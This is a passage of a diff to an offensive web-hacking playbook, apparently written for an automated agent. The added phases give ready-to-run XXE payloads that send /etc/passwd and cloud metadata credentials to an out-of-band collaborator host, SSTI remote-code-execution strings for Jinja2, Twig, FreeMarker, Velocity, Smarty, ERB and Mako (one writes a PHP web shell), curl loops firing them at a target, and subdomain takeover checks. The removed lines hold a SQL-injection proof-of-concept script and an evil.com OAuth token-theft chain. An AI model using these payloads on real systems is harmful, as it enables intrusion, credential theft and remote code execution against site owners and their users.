+  -H "$AUTH" -mc 200 -o idor_ffuf.json -of json 2>/dev/null
+```
+
+## PHASE 14 — XXE OOB EXFILTRATION
+
+```bash
+COLLAB="UNIQUE.burpcollaborator.net"
+TARGET_URL="https://target.com"
+
+# Linux file read + OOB
+cat > xxe_linux.xml << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://$COLLAB/?data=%file;'>">
+  %wrap;
+  %send;
+]>
+<root><data>test</data></root>
+EOF
+
+# Windows file read + OOB
+cat > xxe_windows.xml << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+  <!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://$COLLAB/?data=%file;'>">
+  %wrap;
+  %send;
+]>
+<root><data>test</data></root>
+EOF
+
+# AWS metadata SSRF via XXE
+cat > xxe_aws.xml << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<root><data>&xxe;</data></root>
+EOF
+
+# Error-based XXE
+cat > xxe_error.xml << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+]>
+<root/>
+EOF
+
+# SVG upload XXE
+cat > xxe.svg << EOF
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text font-size="15">&xxe;</text>
+</svg>
+EOF
+
+# Test targets
+curl -s -X POST "$TARGET_URL/api/import" \
+  -H "Content-Type: application/xml" --data-binary @xxe_linux.xml | tee xxe_xml_resp.txt
+
+curl -s -X POST "$TARGET_URL/api/soap" \
+  -H "Content-Type: text/xml; charset=utf-8" \
+  -H "SOAPAction: test" --data-binary @xxe_linux.xml | tee xxe_soap_resp.txt
+
+curl -s -X POST "$TARGET_URL/api/avatar" \
+  -F "file=@xxe.svg;type=image/svg+xml" | tee xxe_svg_resp.txt
+
+curl -s -X POST "$TARGET_URL/api/import" \
+  -H "Content-Type: application/json" \
+  -d "{\"data\":\"$(cat xxe_linux.xml | base64 -w0)\"}" | tee xxe_b64_resp.txt
+```
+
+## PHASE 15 — SSTI PER ENGINE
+
+```bash
+TARGET_URL="https://target.com/page"
+PARAM="name"
+
+urlencode() { python3 -c "import urllib.parse; print(urllib.parse.quote('$1'))"; }
+
+# Detection
+for payload in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '*{7*7}' '[[7*7]]' '{7*7}'; do
+  ENC=$(urlencode "$payload")
+  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
+  echo "$payload -> $(echo $RESP | grep -oP '49|Error|Exception|undefined' | head -1)" | tee -a ssti_detect.txt
+done
+
+# ===== JINJA2 (Python/Flask) =====
+JINJA2_RCE1='{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'
+JINJA2_RCE2='{{cycler.__init__.__globals__.os.popen("id").read()}}'
+JINJA2_RCE3='{{joiner.__init__.__globals__.os.popen("id").read()}}'
+JINJA2_RCE4='{{namespace.__init__.__globals__.os.popen("id").read()}}'
+JINJA2_RCE5='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
+JINJA2_RCE6='{{"".__class__.__mro__[1].__subclasses__()[213]("id",shell=True,stdout=-1).communicate()[0]}}'
+# Blind SSRF/OOB
+JINJA2_OOB='{{request.application.__globals__.__builtins__.__import__("urllib.request").urlopen("http://COLLAB/")}}'
+
+for rce in "$JINJA2_RCE1" "$JINJA2_RCE2" "$JINJA2_RCE3" "$JINJA2_RCE4" "$JINJA2_RCE5"; do
+  ENC=$(urlencode "$rce")
+  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
+  echo "$RESP" | grep -qiP "uid=|root|www-data" && echo "[RCE] $rce" | tee -a ssti_jinja2_rce.txt
+done
+
+# ===== TWIG (PHP) =====
+TWIG_RCE1='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
+TWIG_RCE2='{{["id"]|map("system")|join}}'
+TWIG_RCE3='{{["id", "0"]|sort("system")|join}}'
+TWIG_RCE4='{{{"a":"id"}|map("system")}}'
+TWIG_RCE5='{{"/etc/passwd"|file_excerpt(1,30)}}'
+TWIG_RCE6='<|"id"|system>'
+# Twig v1 only
+TWIG_V1='{{_self.env.enableDebug()}}{{_self.env.disableAutoEscape()}}'
+
+for rce in "$TWIG_RCE1" "$TWIG_RCE2" "$TWIG_RCE3" "$TWIG_RCE4"; do
+  ENC=$(urlencode "$rce")
+  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
+  echo "$RESP" | grep -qiP "uid=|root|www-data" && echo "[RCE] Twig: $rce" | tee -a ssti_twig_rce.txt
+done
+
+# ===== FREEMARKER (Java) =====
+FREEMARKER_RCE1='<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
+FREEMARKER_RCE2='${product.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}'
+FREEMARKER_RCE3='<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.field("DEFAULT_WRAPPER").get(owc)><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${dwf.newInstance(ec,null)("id")}'
+FREEMARKER_DETECT='${7*7}'
+
+for rce in "$FREEMARKER_RCE1" "$FREEMARKER_DETECT"; do
+  ENC=$(urlencode "$rce")
+  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
+  echo "Freemarker $rce -> $(echo $RESP | grep -oP '49|uid=\d+' | head -1)" | tee -a ssti_freemarker.txt
+done
+
+# ===== VELOCITY (Java) =====
+VELOCITY_RCE1='#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")'
+VELOCITY_RCE2='#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end'
+VELOCITY_DETECT='#set($x=1+1)$x'
+
+# ===== PEBBLE (Java) =====
+PEBBLE_RCE='{{ variable.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(variable.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id") }}'
+PEBBLE_DETECT='{{ 7*7 }}'
+
+# ===== SMARTY (PHP) =====
+SMARTY_RCE1='{php}echo `id`;{/php}'
+SMARTY_RCE2='{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]); ?>",self::clearConfig())}'
+SMARTY_RCE3='{system("id")}'
+SMARTY_DETECT='{$smarty.version}'
+
+# ===== ERB (Ruby) =====
+ERB_RCE1='<%= `id` %>'
+ERB_RCE2='<%= system("id") %>'
+ERB_RCE3='<%= IO.popen("id").read %>'
+ERB_RCE4='<%= require "open3"; Open3.capture2("id")[0] %>'
+ERB_DETECT='<%= 7*7 %>'
+
+# ===== MAKO (Python) =====
+MAKO_RCE1='${__import__("os").popen("id").read()}'
+MAKO_RCE2='<%\nimport os\nx=os.popen("id").read()\n%>${x}'
+MAKO_RCE3='${self.module.cache.util.os.system("id")}'
+MAKO_DETECT='${7*7}'
+
+# Test all engines
+for rce in "$ERB_RCE1" "$ERB_RCE2" "$ERB_DETECT" "$MAKO_RCE1" "$SMARTY_RCE1" "$SMARTY_DETECT"; do
+  ENC=$(urlencode "$rce")
+  RESP=$(curl -s "${TARGET_URL}?${PARAM}=$ENC")
+  MATCH=$(echo "$RESP" | grep -oP "49|uid=\d+|root|www-data" | head -1)
+  [ -n "$MATCH" ] && echo "[SSTI RCE] $rce ($MATCH)" | tee -a ssti_all_rce.txt
 done
 ```
 
-### Anomaly detection during fuzzing
-Watch for these response anomalies — each is a potential finding:
-```
-Response time spike      -> Blind injection (SQLi, command injection)
-Response size increase   -> Information disclosure
-Response size decrease   -> Filtering/WAF detected something
-Different status code    -> Access control issue
-Different content type   -> Parser confusion
-Server error (500)       -> Unhandled exception, potential injection
-Redirect to login        -> Auth check triggered (interesting endpoint)
-Different headers        -> Different code path executed
+## PHASE 16 — SUBDOMAIN TAKEOVER
+
+```bash
+TARGET_DOMAIN="target.com"
+
+# Check all resolved subdomains for dangling DNS (CNAME pointing to dead service)
+while read sub; do
+  CNAME=$(dig $sub CNAME +short | head -1)
+  if [ -n "$CNAME" ]; then
+    # Check if CNAME target responds
+    STATUS=$(curl -sI "https://$CNAME" -o /dev/null -w "%{http_code}" 2>/dev/null)
+    if [ "$STATUS" = "000" ] || echo "$STATUS" | grep -q "^404$"; then
+      echo "[POTENTIAL TAKEOVER] $sub CNAME -> $CNAME (HTTP $STATUS)" | tee -a takeover_candidates.txt
+    fi
+    # Check for known takeover fingerprints
+    BODY=$(curl -s "https://$sub" 2>/dev/null)
+    for fingerprint in \
+      "There is no app configured at that hostname" \
+      "No such app" \
+      "herokucdn.com" \
+      "Repository not found" \
+      "The feed has not been found" \
+      "This UserVoice subdomain is currently available" \
+      "project not found" \
+      "Sorry, we can't find the content you're looking for at this URL" \
+      "The thing you were looking for is no longer here" \
+      "Unrecognized domain" \
+      "Do you want to register" \
+      "Available for purchase" \
+      "NoSuchBucket" \
+      "fastly error: unknown domain"; do
+      echo "$BODY" | grep -qi "$fingerprint" && \
+        echo "[TAKEOVER] $sub - FINGERPRINT: $fingerprint" | tee -a takeover_confirmed.txt
+    done
+  fi
+done < $WORKSPACE/recon/subdomains/resolved.txt
+
+# Use nuclei takeover templates
+nuclei -l $WORKSPACE/recon/subdomains/resolved.txt \
+  -t http/takeovers/ \
+  -o takeover_nuclei.txt -silent 2>/dev/null
+
+# subjack
+which subjack > /dev/null 2>&1 && \
+  subjack -w $WORKSPACE/recon/subdomains/all_subdomains.txt \
+    -t 100 -timeout 30 -o takeover_subjack.txt -ssl 2>/dev/null
+
+# subzy
+which subzy > /dev/null 2>&1 && \
+  subzy run --targets $WORKSPACE/recon/subdomains/all_subdomains.txt \
+    --output takeover_subzy.txt 2>/dev/null
 ```
 
+## PHASE 17 — CVE-CLASS PATTERN RECOGNITION
+
+Recognize code patterns that historically generate CVEs:
+
+```
+PHP CVE PATTERNS:
+  - unserialize() with user input → PHP Object Injection (CVE class: CWE-502)
+  - include($variable) without whitelist → RFI/LFI (CWE-22, CWE-98)
+  - eval() with template data → RCE (CWE-94)
+  - move_uploaded_file() without extension check → Unrestricted Upload (CWE-434)
+  - preg_replace() with /e modifier → RCE (deprecated PHP 5.5+, still seen)
+  - strcmp() for auth → Type Juggling bypass
+  - == for password comparison → Type Juggling (md5("240610708")==md5("QNKCDZO"))
+
+NODE.JS CVE PATTERNS:
+  - require() with user path → Path Traversal + RCE
+  - child_process.exec with string concat → Command Injection (CWE-77)
+  - eval()/Function() with user data → RCE (CWE-94)
+  - lodash.merge() with user JSON → Prototype Pollution (CVE-2019-10744)
+  - serialize() + eval() → RCE (node-serialize CVE-2017-5941)
+  - jwt.verify() without algorithm check → Algorithm Confusion
+  - mongoose find({}) with req.query spread → NoSQL Injection (CWE-943)
+
+PYTHON CVE PATTERNS:
+  - yaml.load() without Loader → RCE via PyYAML (CWE-502)
+  - pickle.loads() with user data → RCE (CWE-502)
+  - subprocess with shell=True + user data → Command Injection
+  - Jinja2 render_template_string with user data → SSTI (CWE-94)
+  - Django ORM .extra() / .raw() with string format → SQLi (CWE-89)
+  - flask.redirect() with user URL → Open Redirect (CWE-601)
+  - os.path.join() with leading "/" in user part → Path Override
+
+JAVA CVE PATTERNS:
+  - ObjectInputStream.readObject() → Deserialization RCE (CWE-502)
+  - Runtime.exec() with String concat → Command Injection (CWE-78)
+  - DocumentBuilderFactory without setFeature disallow-doctype → XXE (CWE-611)
+  - XStream.fromXML() without security config → CVE class (CWE-502)
+  - Velocity/FreeMarker template from user input → SSTI
+  - Spring @RequestMapping without @PreAuthorize → Missing Auth (CVE class)
+  - Java EL in JSP/Thymeleaf with user data → EL Injection (CWE-917)
+
+.NET CVE PATTERNS:
+  - BinaryFormatter.Deserialize() → RCE (CWE-502, Microsoft advisories)
+  - TypeNameHandling.All in Newtonsoft → RCE (CWE-502)
+  - Response.Write() without HtmlEncode → XSS (CWE-79)
+  - SqlCommand with string concat → SQLi (CWE-89)
+  - Server.Execute() / Response.Redirect() with user URL → Open Redirect
+  - ViewState without MAC → Deserialization (CVE class)
+
+GO CVE PATTERNS:
+  - http.ServeFile() with user path and no validation → Path Traversal
+  - template.HTML() / template.JS() cast → XSS bypass (CWE-79)
+  - exec.Command() with string builder → Command Injection
+  - sql.Query() with Sprintf → SQLi (CWE-89)
+```
+
+## ZERO-DAY REPORT TEMPLATE
+
+```
+=== ZERO-DAY FINDING ===
+Title:
+CVE Class:
+Severity: Critical / High / Medium / Low
+CVSS Score:
+Affected Component:
+Affected Version:
+Vulnerability Type:
+
+DESCRIPTION:
+(technical explanation of the vulnerability)
+
+ROOT CAUSE:
+(specific code pattern or misconfiguration)
+
+PROOF OF CONCEPT:
+Request:
+---
+[HTTP request or payload]
 ---
 
-## Phase 6 — Chain construction
-
-### Chain catalog
-Low-severity bugs become critical when chained:
-
-```
-SSRF -> cloud metadata -> credentials -> S3/database access -> full data breach
-
-Open redirect + OAuth -> account takeover
-  1. OAuth flow uses redirect_uri=https://target.com/callback
-  2. Open redirect at /redirect?url=https://evil.com
-  3. Set redirect_uri=https://target.com/redirect?url=https://evil.com/steal
-  4. Victim authorizes -> code redirected to evil.com -> steal code -> takeover
-
-Self-XSS + CSRF -> stored XSS against any user
-  1. XSS in profile bio (only visible to self)
-  2. CSRF allows changing another user's profile
-  3. Combine: CSRF changes victim's bio to XSS payload
-  4. Anyone viewing victim's profile executes XSS
-
-LFI + log poisoning -> RCE
-LFI + phpinfo() -> RCE (race condition on tmp file)
-LFI + /proc/self/environ -> RCE (via User-Agent)
-
-SQLi read + weak credentials -> auth bypass -> admin RCE
-  1. SQLi reads credentials from users table
-  2. Crack hashes offline
-  3. Admin credentials found
-  4. Admin panel has file upload -> web shell
-
-XXE + SSRF -> internal service access
-  1. XXE via file upload
-  2. XXE triggers HTTP request to internal services
-  3. Read internal API responses via XXE
-
-Path traversal in filename + file inclusion -> RCE
-JWT weak secret + IDOR -> full account takeover
-  1. Brute force JWT secret with hashcat
-  2. Forge JWT with victim's user_id
-  3. Access any account
-
-Prototype pollution + gadget chain -> RCE in Node.js
-Cache poisoning + XSS -> stored XSS at scale
-  1. XSS via unkeyed header
-  2. Poison cache
-  3. Every visitor receives XSS payload
-```
-
-### Chain documentation format
-```
-CHAIN: <name>
-Link 1: <finding> [EP-<N>] -> enables: <capability>
-Link 2: <finding> [EP-<N>] -> enables: <capability>
-Link 3: <finding> [EP-<N>] -> enables: <capability>
-Final impact: <what can be achieved>
-Preconditions: <what must be true>
-Steps to test: <ordered steps>
-Status: candidate / needs-validation / confirmed
-```
-
+Response:
+---
+[Server response showing impact]
 ---
 
-## Phase 7 — PoC development
+IMPACT:
+(what an attacker can achieve)
 
-### PoC principles
+REPRODUCTION STEPS:
+1.
+2.
+3.
+
+EVIDENCE:
+File: [path to screenshot/response]
+Hash: [sha256 of evidence file]
+
+REMEDIATION:
+(specific code fix)
+
+REFERENCES:
+- [CVE or CWE references]
 ```
-1. Minimal — prove the bug with the smallest possible payload
-2. Reproducible — works every time, not occasionally
-3. Safe — does not cause damage beyond what is needed to prove the point
-4. Documented — exact steps, exact request, exact response
-5. Reversible — if a file is written, it is cleaned up in the same step
-```
-
-### PoC structure
-```python
-#!/usr/bin/env python3
-"""
-PoC: <vulnerability title>
-Target: <URL/IP>
-Type: <RCE/SQLi/SSRF/etc.>
-CVE: N/A (zero-day)
-Author: pi / fox
-Date: <date>
-Description:
-  <what this proves and how>
-"""
-
-import requests
-
-TARGET = "https://target.com"
-SESSION = "valid_session_cookie"
-
-def check_vulnerable():
-    """Returns True if target is vulnerable."""
-    # Minimal probe — time-based or boolean
-    r = requests.get(f"{TARGET}/api/vuln", 
-                     params={"input": "' AND SLEEP(5)-- -"},
-                     cookies={"session": SESSION},
-                     timeout=10)
-    return r.elapsed.total_seconds() >= 5
-
-def exploit():
-    """Demonstrate impact — read /etc/passwd."""
-    payload = "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -"
-    r = requests.get(f"{TARGET}/api/vuln",
-                     params={"input": payload},
-                     cookies={"session": SESSION})
-    return r.text
-
-if __name__ == "__main__":
-    print("[*] Checking vulnerability...")
-    if check_vulnerable():
-        print("[+] VULNERABLE")
-        print("[*] Extracting /etc/passwd...")
-        result = exploit()
-        print(result)
-    else:
-        print("[-] Not vulnerable or patched")
-```
-
----
-
-## Phase 8 — Evidence and reporting
-
-### Zero-day finding document
-```
-ZERO-DAY FINDING
-================
-Title:          <descriptive title — no CVE yet>
-Type:           <vulnerability class>
-Location:       <exact endpoint, parameter>
-Discovered:     <date>
-Status:         confirmed
-
-TRIGGER
--------
-<exact input that causes the behavior>
-
-REQUEST
--------
-<full HTTP request>
-
-RESPONSE
---------
-<full HTTP response showing impact>
-
-BASELINE
---------
-<what the normal response looks like — showing the difference>
-
-IMPACT
-------
-<what this enables — be specific about demonstrated impact>
-
-ROOT CAUSE
-----------
-<why this exists — code-level explanation if source available>
-<e.g.: "The `id` parameter is interpolated directly into the SQL query
-        at line 47 of /app/routes/api.py without parameterization">
-
-CHAIN
------
-<if part of a chain, list the full chain here>
-
-REPRODUCTION
-------------
-1. <step>
-2. <step>
-3. <step>
-
-REMEDIATION
------------
-<specific fix>
-
-EVIDENCE PATH
--------------
-vulns/confirmed/<title>.txt
-loot/<relevant data>
-```
-
----
-
-## Rules
-- Standard scanners do not find logic bugs — manual analysis is required
-- Never conclude a target is secure — only conclude that testing is complete
-- Every assumption in the code is a potential vulnerability
-- A behavior different from baseline is worth 30 minutes of investigation
-- Low severity + low severity + low severity can equal critical via chaining
-- PoC must demonstrate actual impact — SSRF to 127.0.0.1 is not the same as SSRF to cloud metadata
-- Document every negative result — it narrows the search space
-- Prioritize chaining over individual findings — chains are what get full compromise
